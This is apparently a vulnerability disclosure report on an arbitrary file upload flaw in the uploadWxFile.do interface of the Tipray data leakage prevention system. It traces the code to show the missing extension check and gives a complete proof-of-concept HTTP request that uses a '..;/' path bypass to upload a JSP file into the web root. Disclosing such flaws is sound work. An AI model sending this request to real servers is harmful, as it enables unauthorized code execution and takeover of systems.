# File Upload Vulnerability in the uploadWxFile.do Interface of Tipray Data Leakage Prevention System

## Vulnerability Analysis
From the dependencies, it can be seen that the system relies on `MultipartFile` for file uploads. We performed a global search for this keyword.

<img width="2099" height="240" alt="image" src="https://github.com/user-attachments/assets/d5d31156-f03e-4018-93a0-26d04acc4906" />

The system receives a `MultipartFile` from the frontend and immediately passes it to the `uploadWxFileToRoot` method. We traced into its implementation, focusing on whether there are restrictions on file extensions.

<img width="2139" height="816" alt="image" src="https://github.com/user-attachments/assets/28a1f91f-5f7a-4a34-b8b9-0a348184509c" />

It is obvious that **no restrictions on file extensions are imposed here**. The storage path is `String.valueOf(System.getProperty("catalina.home")) + File.separator + "webapps" + File.separator + "ROOT" + File.separator`, which is essentially the parent directory of the current project.

Based on this, we constructed the following data packet:

```
POST http://ip/trwfe/login.jsp/..;/config/uploadWxFile.do HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydef456
Content-Length: 288

------WebKitFormBoundarydef456
Content-Disposition: form-data; name="file"; filename="test.jsp"  
Content-Type: application/octet-stream


<% out.print("HelloWorldTest");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundarydef456--
```

<img width="1634" height="729" alt="image" src="https://github.com/user-attachments/assets/fbdad1b2-3fc4-4449-8236-65dae6395498" />

<img width="1020" height="230" alt="image" src="https://github.com/user-attachments/assets/d11403f1-95c3-48c7-981c-ac46009a652d" />

Based on the above results, it is proven that the `uploadWxFile.do` interface has an **arbitrary file upload vulnerability**, which can lead to the critical risk of server takeover.

Thank you for your review. Wish you a pleasant day!
